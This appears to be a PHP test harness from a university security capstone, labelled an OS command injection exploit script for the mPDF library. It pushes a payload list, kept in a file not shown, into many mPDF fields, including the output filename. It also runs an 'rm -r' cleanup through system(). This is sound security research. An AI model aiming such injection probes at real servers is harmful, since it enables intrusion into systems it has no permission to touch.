<!-- File: os.php -->
<!-- Assignment: MS Capstone -->
<!-- Lanuguage: PHP -->
<!-- Author: Sean Kells <spk3077@rit.edu> -->
<!-- Description: Exploit Script (OS Command Injection) for mPDF -->
<?php
require_once __DIR__ . '/vendor/autoload.php';
require './php_payloads.php';

// Wipe existing PDFs
system("rm -r /var/www/myapp/pdfs/*");

// createPDF function contains the standard process for producing PDFs for all tests
function createPDF() {
	$pdf = new \Mpdf\Mpdf(['tempDir' => __DIR__ . '/temp']);
	$pdf->SetCompression(false);
	$pdf->AddPage();
	return $pdf;
  }


function check_test_file(string $endpoint, string $command) {
    if (file_exists('/var/www/myapp/test')) {
        echo "Endpoint: ".$endpoint."\nCommand: ".$command."<br/><br/>";
    }
}


// Creator
$i = 0;
foreach ($os_commands as $command) {
    $pdf = createPDF();
    $pdf->SetCreator($command);
    $pdf->OutputFile('/var/www/myapp/pdfs/creator'.$i.'.pdf');
    check_test_file("SetCreator", $command);
    $i++;
}

// Title
$i = 0;
foreach ($os_commands as $command) {
    $pdf = createPDF();
    $pdf->SetTitle($command);
    $pdf->OutputFile('/var/www/myapp/pdfs/title'.$i.'.pdf');
    check_test_file("SetTitle", $command);
    $i++;
}

// Author
$i = 0;
foreach ($os_commands as $command) {
    $pdf = createPDF();
    $pdf->SetAuthor($command);
    $pdf->OutputFile('/var/www/myapp/pdfs/author'.$i.'.pdf');
    check_test_file("SetAuthor", $command);
    $i++;
}

// Subject
$i = 0;
foreach ($os_commands as $command) {
    $pdf = createPDF();
    $pdf->SetSubject($command);
    $pdf->Output('/var/www/myapp/pdfs/subject'.$i.'.pdf', 'F');
    check_test_file("SetSubject", $command);
    $i++;
}

// Keywords
$i = 0;
foreach ($os_commands as $command) {
    $pdf = createPDF();
    $pdf->SetKeywords($command);
    $pdf->Output('/var/www/myapp/pdfs/keywords'.$i.'.pdf', 'F');
    check_test_file("SetKeywords", $command);
    $i++;
}

// Annotation
$i = 0;
foreach ($os_commands as $command) {
    $pdf = createPDF();
	$pdf->Annotation(
		$command,
		145, 24, $command, $command, $command,
		0.7, array(127, 127, 255)
	);
    $pdf->OutputFile('/var/www/myapp/pdfs/annotation'.$i.'.pdf');
    check_test_file("Annotation", $command);
    $i++;
}

// Image Links
$i = 0;
foreach ($os_commands as $command) {
    $pdf = createPDF();
	$pdf->Image("/var/www/myapp/images/xref.jpg", 0, 0, 210, 297, 'jpg', $command, true, false);
    $pdf->OutputFile('/var/www/myapp/pdfs/linkimage'.$i.'.pdf');
    check_test_file("LinkImage", $command);
    $i++;
}

// AutosizeText
$i = 0;
foreach ($os_commands as $command) {
    $pdf = createPDF();
    $pdf->AutosizeText($command, 20.0, 'times', '', 72);
    $pdf->OutputFile('/var/www/myapp/pdfs/autosize'.$i.'.pdf');
    check_test_file("AutosizeText", $command);
    $i++;
}

// MultiCell
$i = 0;
foreach ($os_commands as $command) {
    $pdf = createPDF();
    $pdf->MultiCell( 20.0, 20.0, $command);
    $pdf->OutputFile('/var/www/myapp/pdfs/multicell'.$i.'.pdf');
    check_test_file("MultiCell", $command);
    $i++;
}

// writeHTML
$i = 0;
foreach ($os_commands as $command) {
    $pdf = createPDF();
    $pdf->WriteHTML($command);
    $pdf->OutputFile('/var/www/myapp/pdfs/writehtml'.$i.'.pdf');
    check_test_file("writeHTML", $command);
    $i++;
}

// writeCell
$i = 0;
foreach ($os_commands as $command) {
    $pdf = createPDF();
    $pdf->WriteCell(120, 120, $command);
    $pdf->OutputFile('/var/www/myapp/pdfs/writecell'.$i.'.pdf');
    check_test_file("writeCell", $command);
    $i++;
}

// writeText
$i = 0;
foreach ($os_commands as $command) {
    $pdf = createPDF();
    $pdf->WriteText(60, 60, $command);
    $pdf->OutputFile('/var/www/myapp/pdfs/writetext_true'.$i.'.pdf');
    check_test_file("writeText", $command);
    $i++;
}

// Overwrite
$i = 0;
foreach ($os_commands as $command) {
    $pdf = createPDF();
    
    // Basic text for replacement
    $pdf->SetCreator('Replacethistext');
    $pdf->SetTitle('Replacethistext');
    $pdf->SetAuthor('Replacethistext');
    $pdf->SetSubject('Replacethistext');
    $pdf->SetKeywords('Replacethistext');
    $pdf->Annotation(
        "Replacethistext",
        145, 24, 'Replacethistext', "Replacethistext", "Replacethistext",
        0.7, array(127, 127, 255)
    );
    $pdf->Image("/var/www/myapp/images/xref.jpg", 0, 0, 210, 297, 'jpg', 'Replacethistext', true, false);
    $pdf->MultiCell( 20.0, 20.0, 'Replacethistext');
    $pdf->AutosizeText('Replacethistext', 15.0, 'times', '', 72);
    $pdf->WriteCell(120, 120, 'Replacethistext');
    $pdf->WriteText(60, 60, 'Replacethistext');
    $pdf->WriteHTML('Replacethistext');

    $search = array('Replacethistext');

    $replacement = array($command);

    $pdf->OutputFile('/var/www/myapp/pdfs/overwrite1.0.'.$i.'.pdf');
    $pdf->OverWrite('/var/www/myapp/pdfs/overwrite1.0.'.$i.'.pdf', $search, $replacement, 'F', '/var/www/myapp/pdfs/overwrite2.0.'.$i.'.pdf');
    check_test_file("Replacement", $command);
    $i++;
}

// Output
foreach ($os_commands as $command) {
    $pdf = createPDF();
    $pdf->OutputFile('/var/www/myapp/pdfs/output'.$command);
    check_test_file("Output", $command);
    $i++;
}

?>
<h1 style="text-align:center;">Operating System Command Injection Complete!</h1>